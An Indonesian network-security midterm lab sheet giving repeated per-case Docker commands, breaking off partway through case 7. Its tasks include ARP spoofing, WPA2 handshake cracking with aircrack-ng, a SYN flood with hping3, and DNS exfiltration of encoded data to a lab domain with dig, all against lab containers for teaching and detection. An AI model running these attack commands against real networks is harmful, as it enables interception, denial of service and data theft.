# Lembar Perintah per Kasus (UTS Network Security)

Setiap kasus mengerjakan tujuh tugas yang sama dengan parameter kasusnya. Pilih kasus dari NIM sesuai langkah di dokumen UTS. Jalankan perintah di folder repositori `uts-network-lab`, dan siapkan image uts-* terlebih dahulu.

## Kasus 1 (k1)

Parameter: container target-k1, volume vol-k1, file laporan-k1.txt, kata sandi kunci-k1-2026, domain k1.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k1
docker run --name w-k1 -v vol-k1:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k1.txt'
docker rm w-k1
docker run --rm -v vol-k1:/data alpine cat /data/laporan-k1.txt
docker compose -p k1 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k1 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k1 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k1 > laporan-k1.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k1.txt -out laporan-k1.enc -pass pass:kunci-k1-2026 && sha256sum laporan-k1.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k1.enc -out hasil-k1.txt -pass pass:kunci-k1-2026 && sha256sum hasil-k1.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k1.pem -out cert-k1.pem -days 30 -subj /CN=k1.uts.local && openssl x509 -in cert-k1.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k1
docker run -d --name korban-k1 --network lab-arp-k1 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k1 --network lab-arp-k1 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k1 --network lab-arp-k1 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k1.IPAddress}}' korban-k1 gateway-k1
docker exec korban-k1 arp -a
docker exec -d penyerang-k1 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k1 arp -a
docker exec korban-k1 arp -s <ip-gateway> $(docker exec gateway-k1 cat /sys/class/net/eth0/address)
docker exec korban-k1 arp -a
```

Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k1.txt handshake-k1.cap
```

File `handshake-k1.cap` dan `wordlist-k1.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k1 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k1.exfil.lab @dns
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k1.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k1.log
echo <hex> | xxd -r -p
docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

## Kasus 2 (k2)

Parameter: container target-k2, volume vol-k2, file laporan-k2.txt, kata sandi kunci-k2-2026, domain k2.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k2
docker run --name w-k2 -v vol-k2:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k2.txt'
docker rm w-k2
docker run --rm -v vol-k2:/data alpine cat /data/laporan-k2.txt
docker compose -p k2 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k2 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k2 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k2 > laporan-k2.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k2.txt -out laporan-k2.enc -pass pass:kunci-k2-2026 && sha256sum laporan-k2.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k2.enc -out hasil-k2.txt -pass pass:kunci-k2-2026 && sha256sum hasil-k2.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k2.pem -out cert-k2.pem -days 30 -subj /CN=k2.uts.local && openssl x509 -in cert-k2.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k2
docker run -d --name korban-k2 --network lab-arp-k2 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k2 --network lab-arp-k2 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k2 --network lab-arp-k2 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k2.IPAddress}}' korban-k2 gateway-k2
docker exec korban-k2 arp -a
docker exec -d penyerang-k2 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k2 arp -a
docker exec korban-k2 arp -s <ip-gateway> $(docker exec gateway-k2 cat /sys/class/net/eth0/address)
docker exec korban-k2 arp -a
```

Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k2.txt handshake-k2.cap
```

File `handshake-k2.cap` dan `wordlist-k2.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k2 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k2.exfil.lab @dns
docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k2.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k2.log
echo <hex> | xxd -r -p
docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

## Kasus 3 (k3)

Parameter: container target-k3, volume vol-k3, file laporan-k3.txt, kata sandi kunci-k3-2026, domain k3.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k3
docker run --name w-k3 -v vol-k3:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k3.txt'
docker rm w-k3
docker run --rm -v vol-k3:/data alpine cat /data/laporan-k3.txt
docker compose -p k3 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k3 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k3 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k3 > laporan-k3.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k3.txt -out laporan-k3.enc -pass pass:kunci-k3-2026 && sha256sum laporan-k3.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k3.enc -out hasil-k3.txt -pass pass:kunci-k3-2026 && sha256sum hasil-k3.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k3.pem -out cert-k3.pem -days 30 -subj /CN=k3.uts.local && openssl x509 -in cert-k3.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k3
docker run -d --name korban-k3 --network lab-arp-k3 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k3 --network lab-arp-k3 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k3 --network lab-arp-k3 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k3.IPAddress}}' korban-k3 gateway-k3
docker exec korban-k3 arp -a
docker exec -d penyerang-k3 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k3 arp -a
docker exec korban-k3 arp -s <ip-gateway> $(docker exec gateway-k3 cat /sys/class/net/eth0/address)
docker exec korban-k3 arp -a
```

Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k3.txt handshake-k3.cap
```

File `handshake-k3.cap` dan `wordlist-k3.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k3 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k3.exfil.lab @dns
docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k3.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k3.log
echo <hex> | xxd -r -p
docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

## Kasus 4 (k4)

Parameter: container target-k4, volume vol-k4, file laporan-k4.txt, kata sandi kunci-k4-2026, domain k4.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k4
docker run --name w-k4 -v vol-k4:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k4.txt'
docker rm w-k4
docker run --rm -v vol-k4:/data alpine cat /data/laporan-k4.txt
docker compose -p k4 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k4 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k4 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k4 > laporan-k4.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k4.txt -out laporan-k4.enc -pass pass:kunci-k4-2026 && sha256sum laporan-k4.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k4.enc -out hasil-k4.txt -pass pass:kunci-k4-2026 && sha256sum hasil-k4.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k4.pem -out cert-k4.pem -days 30 -subj /CN=k4.uts.local && openssl x509 -in cert-k4.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k4
docker run -d --name korban-k4 --network lab-arp-k4 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k4 --network lab-arp-k4 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k4 --network lab-arp-k4 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k4.IPAddress}}' korban-k4 gateway-k4
docker exec korban-k4 arp -a
docker exec -d penyerang-k4 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k4 arp -a
docker exec korban-k4 arp -s <ip-gateway> $(docker exec gateway-k4 cat /sys/class/net/eth0/address)
docker exec korban-k4 arp -a
```

Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k4.txt handshake-k4.cap
```

File `handshake-k4.cap` dan `wordlist-k4.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k4 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k4 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k4 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k4 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k4.exfil.lab @dns
docker compose -p k4 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k4.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k4.log
echo <hex> | xxd -r -p
docker compose -p k4 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

## Kasus 5 (k5)

Parameter: container target-k5, volume vol-k5, file laporan-k5.txt, kata sandi kunci-k5-2026, domain k5.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k5
docker run --name w-k5 -v vol-k5:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k5.txt'
docker rm w-k5
docker run --rm -v vol-k5:/data alpine cat /data/laporan-k5.txt
docker compose -p k5 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k5 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k5 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k5 > laporan-k5.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k5.txt -out laporan-k5.enc -pass pass:kunci-k5-2026 && sha256sum laporan-k5.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k5.enc -out hasil-k5.txt -pass pass:kunci-k5-2026 && sha256sum hasil-k5.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k5.pem -out cert-k5.pem -days 30 -subj /CN=k5.uts.local && openssl x509 -in cert-k5.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k5
docker run -d --name korban-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k5.IPAddress}}' korban-k5 gateway-k5
docker exec korban-k5 arp -a
docker exec -d penyerang-k5 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k5 arp -a
docker exec korban-k5 arp -s <ip-gateway> $(docker exec gateway-k5 cat /sys/class/net/eth0/address)
docker exec korban-k5 arp -a
```

Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k5.txt handshake-k5.cap
```

File `handshake-k5.cap` dan `wordlist-k5.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k5 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k5.exfil.lab @dns
docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k5.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k5.log
echo <hex> | xxd -r -p
docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

## Kasus 6 (k6)

Parameter: container target-k6, volume vol-k6, file laporan-k6.txt, kata sandi kunci-k6-2026, domain k6.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k6
docker run --name w-k6 -v vol-k6:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k6.txt'
docker rm w-k6
docker run --rm -v vol-k6:/data alpine cat /data/laporan-k6.txt
docker compose -p k6 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k6 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k6 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k6 > laporan-k6.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k6.txt -out laporan-k6.enc -pass pass:kunci-k6-2026 && sha256sum laporan-k6.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k6.enc -out hasil-k6.txt -pass pass:kunci-k6-2026 && sha256sum hasil-k6.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k6.pem -out cert-k6.pem -days 30 -subj /CN=k6.uts.local && openssl x509 -in cert-k6.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k6
docker run -d --name korban-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k6.IPAddress}}' korban-k6 gateway-k6
docker exec korban-k6 arp -a
docker exec -d penyerang-k6 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k6 arp -a
docker exec korban-k6 arp -s <ip-gateway> $(docker exec gateway-k6 cat /sys/class/net/eth0/address)
docker exec korban-k6 arp -a
```

Bukti: MAC gateway di tabel ARP korban berubah setelah spoofing, lalu kembali normal setelah mitigasi static ARP.

### Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k6.txt handshake-k6.cap
```

File `handshake-k6.cap` dan `wordlist-k6.txt` disediakan penguji. Bukti: kata sandi yang ditemukan atau pesan KEY NOT FOUND, beserta penjelasan empat langkah handshake.

### Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k6 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Bukti: TTL dan tipe ICMP balasan, lalu penjelasan smurf attack.

### Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml down -v
```

Bukti: jumlah SYN_RECV sebelum dan saat serangan, serta paket SYN, SYN-ACK, dan ACK dari tcpdump.

### Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n NIM-ANDA | xxd -p
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k6.exfil.lab @dns
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k6.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k6.log
echo <hex> | xxd -r -p
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Bukti: label hex terdeteksi di log, lalu pesan NIM Anda hasil decode.


---

## Kasus 7 (k7)

Parameter: container target-k7, volume vol-k7, file laporan-k7.txt, kata sandi kunci-k7-2026, domain k7.exfil.lab. Ganti NIM-ANDA dengan NIM Anda. Ganti placeholder <...> dengan hasil perintah sebelumnya.

### Tugas 1 (Pertemuan 1): Docker dan volume

```bash
docker volume create vol-k7
docker run --name w-k7 -v vol-k7:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k7.txt'
docker rm w-k7
docker run --rm -v vol-k7:/data alpine cat /data/laporan-k7.txt
docker compose -p k7 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k7 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k7 -f b/b1-compose/docker-compose.yml down -v
```

Bukti: isi file dari container baru dan halaman nginx dari attacker.

### Tugas 2 (Pertemuan 2): Kriptografi

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k7 > laporan-k7.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k7.txt -out laporan-k7.enc -pass pass:kunci-k7-2026 && sha256sum laporan-k7.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k7.enc -out hasil-k7.txt -pass pass:kunci-k7-2026 && sha256sum hasil-k7.txt'
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k7.pem -out cert-k7.pem -days 30 -subj /CN=k7.uts.local && openssl x509 -in cert-k7.pem -noout -subject -issuer -dates'
```

Bukti: dua hash SHA-256 harus sama, lalu Subject dan Issuer sertifikat.

### Tugas 3 (Pertemuan 3): ARP spoofing

```bash
docker network create lab-arp-k7
docker run -d --name korban-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k7.IPAddress}}' korban-k7 gateway-k7
docker exec korban-k7 arp -a
docker exec -d penyerang-k7 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k7 arp -a
docker exec korban-k7 arp -s <ip-gateway> $(docker exec gateway-k7 cat /sys/class/net/eth0/address)
docker exec korban-k7 arp -a
```

